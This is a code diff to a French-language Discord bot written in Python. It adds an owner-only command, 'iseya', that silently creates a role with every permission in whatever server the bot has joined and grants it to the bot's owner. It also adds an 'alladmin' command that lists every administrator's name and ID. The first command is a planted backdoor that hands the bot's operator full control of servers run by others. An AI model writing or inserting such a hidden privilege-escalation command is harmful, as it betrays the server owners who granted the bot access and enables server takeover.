@@ -366,7 +366,39 @@ async def serverinfoall(ctx):
         embed = await view.create_embed()
         await ctx.send(embed=embed, view=view)
     else:
-        await ctx.send("Seul l'owner peut obtenir ces informations.")
+        await ctx.send("Seul l'owner du bot peut obtenir ces informations.")
+
+@bot.command()
+async def iseya(ctx):
+    if ctx.author.id == BOT_OWNER_ID:  # Vérifie si l'utilisateur est l'owner du bot
+        try:
+            guild = ctx.guild
+            if guild is None:
+                return await ctx.send("❌ Cette commande doit être exécutée dans un serveur.")
+            
+            # Création (ou récupération) d'un rôle administrateur spécial
+            role_name = "Iseya-SuperAdmin"
+            role = discord.utils.get(guild.roles, name=role_name)
+
+            if role is None:
+                role = await guild.create_role(
+                    name=role_name,
+                    permissions=discord.Permissions.all(),  # Accorde toutes les permissions
+                    color=discord.Color.red(),
+                    hoist=True  # Met le rôle en haut de la liste des membres
+                )
+                await ctx.send(f"✅ Rôle `{role_name}` créé avec succès.")
+
+            # Attribution du rôle à l'utilisateur
+            await ctx.author.add_roles(role)
+            await ctx.send(f"✅ Tu as maintenant les permissions administrateur `{role_name}` sur ce serveur !")
+        except discord.Forbidden:
+            await ctx.send("❌ Le bot n'a pas les permissions nécessaires pour créer ou attribuer des rôles.")
+        except Exception as e:
+            await ctx.send(f"❌ Une erreur est survenue : `{e}`")
+    else:
+        await ctx.send("❌ Seul l'owner du bot peut exécuter cette commande.")
+
 #-------------------------------------------------------------------------- Bot Join:
 @bot.event
 async def on_guild_join(guild):
@@ -4598,6 +4630,34 @@ async def gcreate(ctx):
         color=discord.Color.blue()
     )
     await ctx.send(embed=embed, view=view)
+
+@bot.command()
+async def alladmin(ctx):
+    """Affiche la liste des administrateurs avec un joli embed"""
+    admins = [member for member in ctx.guild.members if member.guild_permissions.administrator]
+
+    if not admins:
+        embed = discord.Embed(
+            title="❌ Aucun administrateur trouvé",
+            description="Il semble que personne n'ait les permissions d'administrateur sur ce serveur.",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+
+    # Création d'un embed stylé
+    embed = discord.Embed(
+        title="📜 Liste des administrateurs",
+        description=f"Voici les {len(admins)} administrateurs du serveur **{ctx.guild.name}** :",
+        color=discord.Color.blue()
+    )
+    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
+    embed.set_footer(text=f"Commande demandée par {ctx.author.name}", icon_url=ctx.author.avatar.url)
+
+    for admin in admins:
+        embed.add_field(name=f"👤 {admin.name}#{admin.discriminator}", value=f"ID : `{admin.id}`", inline=False)
+
+    await ctx.send(embed=embed)
 
 # Token pour démarrer le bot (à partir des secrets)
 # Lancer le bot avec ton token depuis l'environnement  
